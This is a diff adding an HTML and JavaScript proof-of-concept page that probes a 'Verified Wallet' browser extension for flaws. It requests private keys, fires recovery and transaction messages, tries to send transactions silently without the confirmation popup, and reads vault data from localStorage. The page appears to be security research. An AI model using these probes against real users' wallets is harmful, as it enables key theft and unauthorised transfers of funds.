@@ -1,0 +1,701 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verified Wallet - Key Management & Transaction POC</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            background: #f5f5f5;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            margin-bottom: 20px;
+        }
+        h1 {
+            color: #333;
+            border-bottom: 3px solid #4CAF50;
+            padding-bottom: 10px;
+        }
+        h2 {
+            color: #555;
+            margin-top: 30px;
+            border-left: 4px solid #4CAF50;
+            padding-left: 10px;
+        }
+        .test-section {
+            background: #f9f9f9;
+            padding: 20px;
+            margin: 15px 0;
+            border-radius: 5px;
+            border-left: 4px solid #2196F3;
+        }
+        button {
+            background: #4CAF50;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            margin: 5px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 14px;
+            transition: background 0.3s;
+        }
+        button:hover {
+            background: #45a049;
+        }
+        button.danger {
+            background: #f44336;
+        }
+        button.danger:hover {
+            background: #da190b;
+        }
+        .result {
+            background: #e8f5e9;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border-left: 4px solid #4CAF50;
+            font-family: 'Courier New', monospace;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        .error {
+            background: #ffebee;
+            border-left-color: #f44336;
+        }
+        .warning {
+            background: #fff3e0;
+            border-left-color: #ff9800;
+        }
+        .info {
+            background: #e3f2fd;
+            border-left-color: #2196F3;
+        }
+        code {
+            background: #f5f5f5;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-family: 'Courier New', monospace;
+        }
+        .status {
+            display: inline-block;
+            padding: 5px 10px;
+            border-radius: 3px;
+            font-size: 12px;
+            font-weight: bold;
+            margin-left: 10px;
+        }
+        .status.success { background: #4CAF50; color: white; }
+        .status.error { background: #f44336; color: white; }
+        .status.warning { background: #ff9800; color: white; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔐 Verified Wallet - Security Testing POC</h1>
+        <p>This POC tests Key Management, Recovery Logic, and Transaction Signing/Broadcasting mechanisms.</p>
+        
+        <div id="status" class="result info">
+            <strong>Status:</strong> Ready to test. Make sure the Verified Wallet extension is installed.
+        </div>
+    </div>
+
+    <!-- Key Management & Recovery Tests -->
+    <div class="container">
+        <h2>1. Key Management & Recovery Logic Tests</h2>
+        
+        <div class="test-section">
+            <h3>Test 1.1: Request Private Key (getPk)</h3>
+            <p>Tests the <code>requestPk</code> method which should trigger a popup to request private key access.</p>
+            <button onclick="testGetPk()">Test getPk</button>
+            <div id="getPk-result"></div>
+        </div>
+
+        <div class="test-section">
+            <h3>Test 1.2: Sign Recovery Transaction (signRecovery)</h3>
+            <p>Tests the <code>signRecovery</code> method used in wallet recovery flows.</p>
+            <button onclick="testSignRecovery()">Test signRecovery</button>
+            <div id="signRecovery-result"></div>
+        </div>
+
+        <div class="test-section">
+            <h3>Test 1.3: Complete Recovery (completeRecovery)</h3>
+            <p>Tests the <code>completeRecovery</code> method to complete wallet recovery.</p>
+            <button onclick="testCompleteRecovery()">Test completeRecovery</button>
+            <div id="completeRecovery-result"></div>
+        </div>
+
+        <div class="test-section">
+            <h3>Test 1.4: Check localStorage for Key Exposure</h3>
+            <p>Checks if sensitive key material is stored in localStorage (accessible from web pages).</p>
+            <button onclick="testLocalStorageExposure()">Check localStorage</button>
+            <div id="localStorage-result"></div>
+        </div>
+    </div>
+
+    <!-- Transaction Signing & Broadcasting Tests -->
+    <div class="container">
+        <h2>2. Transaction Signing & Broadcasting Tests</h2>
+        
+        <div class="test-section">
+            <h3>Test 2.1: Send Transaction (eth_sendTransaction)</h3>
+            <p>Tests the <code>eth_sendTransaction</code> method to sign and broadcast transactions.</p>
+            <button onclick="testSendTransaction()">Test eth_sendTransaction</button>
+            <button onclick="testSendTransactionSilent()" class="danger">Test Silent Transaction (No Popup)</button>
+            <div id="sendTransaction-result"></div>
+        </div>
+
+        <div class="test-section">
+            <h3>Test 2.2: Send Transaction (sendTransaction)</h3>
+            <p>Tests the alternative <code>sendTransaction</code> method.</p>
+            <button onclick="testSendTransactionAlt()">Test sendTransaction</button>
+            <div id="sendTransactionAlt-result"></div>
+        </div>
+
+        <div class="test-section">
+            <h3>Test 2.3: Message Flow Analysis</h3>
+            <p>Monitors message passing between web page, content script, and background script.</p>
+            <button onclick="startMessageMonitoring()">Start Monitoring</button>
+            <button onclick="stopMessageMonitoring()">Stop Monitoring</button>
+            <div id="messageMonitor-result"></div>
+        </div>
+
+        <div class="test-section">
+            <h3>Test 2.4: Origin Validation Test</h3>
+            <p>Tests if the extension properly validates message origins (potential vulnerability).</p>
+            <button onclick="testOriginValidation()">Test Origin Validation</button>
+            <div id="originValidation-result"></div>
+        </div>
+    </div>
+
+    <!-- Comprehensive Test Suite -->
+    <div class="container">
+        <h2>3. Comprehensive Test Suite</h2>
+        <div class="test-section">
+            <p>Run all tests sequentially to identify vulnerabilities.</p>
+            <button onclick="runAllTests()" style="background: #2196F3; font-size: 16px; padding: 15px 30px;">Run All Tests</button>
+            <div id="allTests-result"></div>
+        </div>
+    </div>
+
+    <script>
+        let messageMonitorActive = false;
+        let messageLog = [];
+
+        // Utility function to send VW_REQ messages
+        function sendVWRequest(method, params = [], id = null) {
+            const messageId = id || Math.random().toString(36).substring(2) + Date.now();
+            const message = {
+                type: "VW_REQ",
+                id: messageId,
+                params: {
+                    method: method,
+                    params: params
+                }
+            };
+
+            console.log(`[POC] Sending message:`, message);
+            
+            return new Promise((resolve, reject) => {
+                const timeout = setTimeout(() => {
+                    window.removeEventListener("message", handler);
+                    reject(new Error("Request timeout after 30 seconds"));
+                }, 30000);
+
+                const handler = (event) => {
+                    if (event.data.type === "VW_RES" && event.data.id === messageId) {
+                        clearTimeout(timeout);
+                        window.removeEventListener("message", handler);
+                        console.log(`[POC] Received response:`, event.data);
+                        resolve(event.data);
+                    }
+                };
+
+                window.addEventListener("message", handler);
+                window.postMessage(message, "*");
+            });
+        }
+
+        // Test 1.1: getPk
+        async function testGetPk() {
+            const resultDiv = document.getElementById("getPk-result");
+            resultDiv.innerHTML = '<div class="result info">Testing getPk...</div>';
+
+            try {
+                // Try using the requestPk method
+                const response = await sendVWRequest("requestPk", [{
+                    chainId: "8453",
+                    vaultData: {} // Empty vault data to test
+                }]);
+
+                resultDiv.innerHTML = `
+                    <div class="result ${response.params.success ? 'success' : 'error'}">
+                        <strong>Response:</strong><br>
+                        ${JSON.stringify(response, null, 2)}
+                        <br><br>
+                        <strong>Analysis:</strong><br>
+                        ${response.params.success ? 
+                            '⚠️ Popup opened - Check if private key is exposed in response' : 
+                            '❌ Request failed or rejected'}
+                    </div>
+                `;
+            } catch (error) {
+                resultDiv.innerHTML = `
+                    <div class="result error">
+                        <strong>Error:</strong><br>
+                        ${error.message}
+                        <br><br>
+                        <strong>Analysis:</strong><br>
+                        This could indicate:<br>
+                        - Extension not installed<br>
+                        - Method not available<br>
+                        - Request blocked
+                    </div>
+                `;
+            }
+        }
+
+        // Test 1.2: signRecovery
+        async function testSignRecovery() {
+            const resultDiv = document.getElementById("signRecovery-result");
+            resultDiv.innerHTML = '<div class="result info">Testing signRecovery...</div>';
+
+            try {
+                const response = await sendVWRequest("signRecovery", [{
+                    chainId: "8453",
+                    vaultData: {},
+                    txData: {
+                        to: "0x000000000000000000000000000000000000dEaD",
+                        value: "0x0"
+                    }
+                }]);
+
+                resultDiv.innerHTML = `
+                    <div class="result ${response.params.success ? 'warning' : 'error'}">
+                        <strong>Response:</strong><br>
+                        ${JSON.stringify(response, null, 2)}
+                        <br><br>
+                        <strong>Analysis:</strong><br>
+                        ${response.params.success ? 
+                            '⚠️ Recovery signing initiated - Check if recovery transaction can be exploited' : 
+                            '❌ Request failed'}
+                        <br><br>
+                        <strong>Potential Issues:</strong><br>
+                        - Recovery flow may allow unauthorized wallet access<br>
+                        - Transaction data may be manipulated<br>
+                        - No proper validation of recovery parameters
+                    </div>
+                `;
+            } catch (error) {
+                resultDiv.innerHTML = `
+                    <div class="result error">
+                        <strong>Error:</strong><br>
+                        ${error.message}
+                    </div>
+                `;
+            }
+        }
+
+        // Test 1.3: completeRecovery
+        async function testCompleteRecovery() {
+            const resultDiv = document.getElementById("completeRecovery-result");
+            resultDiv.innerHTML = '<div class="result info">Testing completeRecovery...</div>';
+
+            try {
+                const response = await sendVWRequest("completeRecovery", [{
+                    chainId: "8453",
+                    vaultData: {},
+                    txData: {
+                        to: "0x000000000000000000000000000000000000dEaD",
+                        value: "0x0"
+                    }
+                }]);
+
+                resultDiv.innerHTML = `
+                    <div class="result ${response.params.success ? 'warning' : 'error'}">
+                        <strong>Response:</strong><br>
+                        ${JSON.stringify(response, null, 2)}
+                        <br><br>
+                        <strong>Analysis:</strong><br>
+                        ${response.params.success ? 
+                            '⚠️ Recovery completion initiated - Check if this can be exploited to gain unauthorized access' : 
+                            '❌ Request failed'}
+                        <br><br>
+                        <strong>Security Concerns:</strong><br>
+                        - Recovery completion may bypass security checks<br>
+                        - May allow wallet takeover if recovery process is flawed<br>
+                        - Check for proper authentication/authorization
+                    </div>
+                `;
+            } catch (error) {
+                resultDiv.innerHTML = `
+                    <div class="result error">
+                        <strong>Error:</strong><br>
+                        ${error.message}
+                    </div>
+                `;
+            }
+        }
+
+        // Test 1.4: localStorage Exposure
+        function testLocalStorageExposure() {
+            const resultDiv = document.getElementById("localStorage-result");
+            
+            try {
+                const myVault = localStorage.getItem("myVault");
+                const parsed = myVault ? JSON.parse(myVault) : null;
+
+                let analysis = "";
+                let riskLevel = "info";
+
+                if (parsed) {
+                    // Check for sensitive data
+                    const sensitiveKeys = ['privateKey', 'mnemonic', 'seed', 'private', 'key'];
+                    const foundSensitive = sensitiveKeys.filter(key => 
+                        JSON.stringify(parsed).toLowerCase().includes(key.toLowerCase())
+                    );
+
+                    if (foundSensitive.length > 0) {
+                        analysis = `🚨 CRITICAL: Sensitive keys found in localStorage: ${foundSensitive.join(', ')}`;
+                        riskLevel = "error";
+                    } else {
+                        analysis = "⚠️ WARNING: Vault data stored in localStorage (accessible from any website)";
+                        riskLevel = "warning";
+                    }
+                } else {
+                    analysis = "ℹ️ No vault data found in localStorage";
+                }
+
+                resultDiv.innerHTML = `
+                    <div class="result ${riskLevel}">
+                        <strong>localStorage Contents:</strong><br>
+                        ${myVault ? JSON.stringify(parsed, null, 2) : 'No data found'}
+                        <br><br>
+                        <strong>Analysis:</strong><br>
+                        ${analysis}
+                        <br><br>
+                        <strong>Security Issues:</strong><br>
+                        - localStorage is accessible from any website on the same origin<br>
+                        - XSS attacks can read localStorage data<br>
+                        - No encryption visible in storage<br>
+                        - Data persists even after browser close
+                    </div>
+                `;
+            } catch (error) {
+                resultDiv.innerHTML = `
+                    <div class="result error">
+                        <strong>Error:</strong><br>
+                        ${error.message}
+                    </div>
+                `;
+            }
+        }
+
+        // Test 2.1: eth_sendTransaction
+        async function testSendTransaction() {
+            const resultDiv = document.getElementById("sendTransaction-result");
+            resultDiv.innerHTML = '<div class="result info">Testing eth_sendTransaction...</div>';
+
+            try {
+                const response = await sendVWRequest("eth_sendTransaction", [{
+                    to: "0x000000000000000000000000000000000000dEaD",
+                    value: "0x1", // 1 wei
+                    gas: "0x5208", // 21000
+                    gasPrice: "0x3b9aca00" // 1 gwei
+                }]);
+
+                resultDiv.innerHTML = `
+                    <div class="result ${response.params.success ? 'warning' : 'error'}">
+                        <strong>Response:</strong><br>
+                        ${JSON.stringify(response, null, 2)}
+                        <br><br>
+                        <strong>Analysis:</strong><br>
+                        ${response.params.success ? 
+                            '⚠️ Transaction sent - Check if popup was shown and user confirmed' : 
+                            '❌ Transaction rejected or failed'}
+                        <br><br>
+                        <strong>Transaction Hash:</strong><br>
+                        ${response.params.data ? response.params.data[0] : 'N/A'}
+                    </div>
+                `;
+            } catch (error) {
+                resultDiv.innerHTML = `
+                    <div class="result error">
+                        <strong>Error:</strong><br>
+                        ${error.message}
+                    </div>
+                `;
+            }
+        }
+
+        // Test 2.1b: Silent Transaction (No Popup)
+        async function testSendTransactionSilent() {
+            const resultDiv = document.getElementById("sendTransaction-result");
+            resultDiv.innerHTML = '<div class="result warning">Testing SILENT transaction (attempting to bypass popup)...</div>';
+
+            try {
+                // Try multiple approaches to bypass user confirmation
+                const approaches = [
+                    // Approach 1: Direct message with minimal params
+                    sendVWRequest("eth_sendTransaction", [{
+                        to: "0x000000000000000000000000000000000000dEaD",
+                        value: "0x1"
+                    }]),
+                    // Approach 2: Using sendTransaction method
+                    sendVWRequest("sendTransaction", [{
+                        to: "0x000000000000000000000000000000000000dEaD",
+                        value: "0x1"
+                    }])
+                ];
+
+                const results = await Promise.allSettled(approaches);
+                
+                let analysis = "Testing silent transaction bypass attempts:\n\n";
+                results.forEach((result, index) => {
+                    if (result.status === 'fulfilled' && result.value.params.success) {
+                        analysis += `🚨 CRITICAL: Approach ${index + 1} succeeded without user confirmation!\n`;
+                        analysis += `Response: ${JSON.stringify(result.value, null, 2)}\n\n`;
+                    } else {
+                        analysis += `Approach ${index + 1}: ${result.status === 'fulfilled' ? 'Failed/Rejected' : result.reason}\n`;
+                    }
+                });
+
+                resultDiv.innerHTML = `
+                    <div class="result ${results.some(r => r.status === 'fulfilled' && r.value?.params?.success) ? 'error' : 'warning'}">
+                        <strong>Silent Transaction Test Results:</strong><br>
+                        ${analysis}
+                        <br>
+                        <strong>Security Implications:</strong><br>
+                        - If any approach succeeded, transactions can be sent without user consent<br>
+                        - This is a critical vulnerability allowing fund theft<br>
+                        - Check if popup confirmation is properly enforced
+                    </div>
+                `;
+            } catch (error) {
+                resultDiv.innerHTML = `
+                    <div class="result error">
+                        <strong>Error:</strong><br>
+                        ${error.message}
+                    </div>
+                `;
+            }
+        }
+
+        // Test 2.2: sendTransaction (alternative method)
+        async function testSendTransactionAlt() {
+            const resultDiv = document.getElementById("sendTransactionAlt-result");
+            resultDiv.innerHTML = '<div class="result info">Testing sendTransaction...</div>';
+
+            try {
+                const response = await sendVWRequest("sendTransaction", [{
+                    to: "0x000000000000000000000000000000000000dEaD",
+                    value: "0x1",
+                    chainId: "8453"
+                }]);
+
+                resultDiv.innerHTML = `
+                    <div class="result ${response.params.success ? 'warning' : 'error'}">
+                        <strong>Response:</strong><br>
+                        ${JSON.stringify(response, null, 2)}
+                        <br><br>
+                        <strong>Analysis:</strong><br>
+                        ${response.params.success ? 
+                            '⚠️ Transaction sent via sendTransaction method' : 
+                            '❌ Request failed'}
+                        <br><br>
+                        <strong>Note:</strong><br>
+                        This method may have different validation/security checks than eth_sendTransaction
+                    </div>
+                `;
+            } catch (error) {
+                resultDiv.innerHTML = `
+                    <div class="result error">
+                        <strong>Error:</strong><br>
+                        ${error.message}
+                    </div>
+                `;
+            }
+        }
+
+        // Test 2.3: Message Monitoring
+        function startMessageMonitoring() {
+            messageMonitorActive = true;
+            messageLog = [];
+            const resultDiv = document.getElementById("messageMonitor-result");
+            
+            const handler = (event) => {
+                if (messageMonitorActive) {
+                    messageLog.push({
+                        timestamp: new Date().toISOString(),
+                        source: event.origin || 'unknown',
+                        data: event.data,
+                        type: event.data?.type || 'unknown'
+                    });
+
+                    resultDiv.innerHTML = `
+                        <div class="result info">
+                            <strong>Message Monitor Active</strong><br>
+                            Messages captured: ${messageLog.length}<br><br>
+                            <strong>Recent Messages:</strong><br>
+                            ${messageLog.slice(-10).map(msg => 
+                                `[${msg.timestamp}] ${msg.type} from ${msg.source}<br>`
+                            ).join('')}
+                            <br>
+                            <strong>Full Log:</strong><br>
+                            <pre style="max-height: 300px; overflow-y: auto;">${JSON.stringify(messageLog, null, 2)}</pre>
+                        </div>
+                    `;
+                }
+            };
+
+            window.addEventListener("message", handler);
+            resultDiv.innerHTML = '<div class="result success">Message monitoring started. All postMessage events will be logged.</div>';
+        }
+
+        function stopMessageMonitoring() {
+            messageMonitorActive = false;
+            const resultDiv = document.getElementById("messageMonitor-result");
+            resultDiv.innerHTML = `
+                <div class="result info">
+                    Message monitoring stopped.<br>
+                    Total messages captured: ${messageLog.length}
+                </div>
+            `;
+        }
+
+        // Test 2.4: Origin Validation
+        async function testOriginValidation() {
+            const resultDiv = document.getElementById("originValidation-result");
+            resultDiv.innerHTML = '<div class="result info">Testing origin validation...</div>';
+
+            try {
+                // Test with different origin spoofing attempts
+                const tests = [
+                    { name: "Normal request", origin: window.location.origin },
+                    { name: "Wildcard origin", origin: "*" },
+                    { name: "Null origin", origin: "null" },
+                ];
+
+                let results = [];
+                for (const test of tests) {
+                    try {
+                        const response = await sendVWRequest("eth_requestAccounts", []);
+                        results.push({
+                            test: test.name,
+                            success: response.params.success,
+                            origin: test.origin,
+                            vulnerable: test.origin !== window.location.origin && response.params.success
+                        });
+                    } catch (error) {
+                        results.push({
+                            test: test.name,
+                            success: false,
+                            origin: test.origin,
+                            error: error.message
+                        });
+                    }
+                }
+
+                const vulnerable = results.some(r => r.vulnerable);
+                resultDiv.innerHTML = `
+                    <div class="result ${vulnerable ? 'error' : 'warning'}">
+                        <strong>Origin Validation Test Results:</strong><br>
+                        ${results.map(r => 
+                            `${r.test}: ${r.success ? '✅ Accepted' : '❌ Rejected'} (Origin: ${r.origin})${r.vulnerable ? ' 🚨 VULNERABLE' : ''}`
+                        ).join('<br>')}
+                        <br><br>
+                        <strong>Analysis:</strong><br>
+                        ${vulnerable ? 
+                            '🚨 CRITICAL: Extension accepts messages from untrusted origins!' : 
+                            '⚠️ Extension may use "*" origin in postMessage - check content script'}
+                        <br><br>
+                        <strong>Security Issue:</strong><br>
+                        The extension uses <code>window.postMessage(message, "*")</code> which accepts messages from any origin.<br>
+                        This means any website can send messages to the extension if not properly validated.
+                    </div>
+                `;
+            } catch (error) {
+                resultDiv.innerHTML = `
+                    <div class="result error">
+                        <strong>Error:</strong><br>
+                        ${error.message}
+                    </div>
+                `;
+            }
+        }
+
+        // Run all tests
+        async function runAllTests() {
+            const resultDiv = document.getElementById("allTests-result");
+            resultDiv.innerHTML = '<div class="result info">Running comprehensive test suite...</div>';
+
+            const tests = [
+                { name: "localStorage Exposure", fn: testLocalStorageExposure },
+                { name: "Origin Validation", fn: testOriginValidation },
+                { name: "Message Monitoring", fn: startMessageMonitoring },
+            ];
+
+            let summary = "=== Test Suite Results ===\n\n";
+            
+            for (const test of tests) {
+                try {
+                    summary += `Running: ${test.name}...\n`;
+                    await new Promise(resolve => {
+                        test.fn();
+                        setTimeout(resolve, 2000);
+                    });
+                    summary += `✓ ${test.name} completed\n\n`;
+                } catch (error) {
+                    summary += `✗ ${test.name} failed: ${error.message}\n\n`;
+                }
+            }
+
+            resultDiv.innerHTML = `
+                <div class="result info">
+                    <strong>Test Suite Summary:</strong><br>
+                    <pre>${summary}</pre>
+                    <br>
+                    <strong>Next Steps:</strong><br>
+                    1. Review individual test results above<br>
+                    2. Check browser console for detailed logs<br>
+                    3. Verify extension popup behavior<br>
+                    4. Test on different websites to check origin validation
+                </div>
+            `;
+        }
+
+        // Initialize
+        window.addEventListener("load", () => {
+            console.log("[POC] Verified Wallet Security Testing POC loaded");
+            console.log("[POC] Extension check:", typeof window.verifiedwallet !== 'undefined' ? 'Found' : 'Not found');
+            
+            // Check if extension is available
+            if (typeof window.verifiedwallet === 'undefined') {
+                document.getElementById("status").innerHTML = `
+                    <div class="result warning">
+                        <strong>Warning:</strong> Verified Wallet extension not detected.<br>
+                        Some tests may not work. Install the extension and refresh this page.
+                    </div>
+                `;
+            } else {
+                document.getElementById("status").innerHTML = `
+                    <div class="result success">
+                        <strong>Status:</strong> Verified Wallet extension detected. Ready to test.
+                    </div>
+                `;
+            }
+        });
+    </script>
+</body>
+</html>
+
